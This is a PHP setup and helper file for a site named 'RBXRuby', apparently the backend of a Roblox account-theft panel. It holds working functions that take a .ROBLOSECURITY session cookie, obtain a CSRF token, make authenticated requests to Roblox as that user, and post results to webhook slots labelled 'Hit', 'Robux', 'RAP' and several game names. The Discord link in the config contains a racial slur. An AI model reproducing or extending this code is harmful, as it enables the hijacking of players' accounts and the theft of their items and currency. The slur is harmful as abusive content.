<?php
$setup = [
    "SiteName" => "RBXRuby",
    "SiteLogo" => "",
    "HitHook" => "",
    "GenHook" => "",
    "RefreshHook" => "",
    "RapHook" => "",
    "PS99Hook" => "",
    "AMPHook" => "",
    "BFHook" => "",
    "RobuxHook" => "",
    "MM2Hook" => "",
    "Discord" => "https://discord.gg/nigger",
];
function get_csrf_token($cookie) {
    $ch = curl_init("https://auth.roblox.com/v2/login");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array("{}")));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: .ROBLOSECURITY=$cookie"));
    $output = curl_exec($ch);
    curl_close($ch);
    preg_match('/X-CSRF-TOKEN:\s*(\S+)/i', $output, $matches);
    return $matches[1];
};
function request($url, $cookie, $csrf) {
    $headers = [
        "Content-Type: application/json",
        "Cookie: .ROBLOSECURITY=$cookie",
        "x-csrf-token: $csrf"
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
};
function send_webhook($webhook, $payload) {
    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'Content-Length: ' . strlen($payload),
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
};
function log_error($message) {
    global $error_log_file;
    file_put_contents($error_log_file, "[" . date('Y-m-d H:i:s') . "] $message\n", FILE_APPEND);
};
?>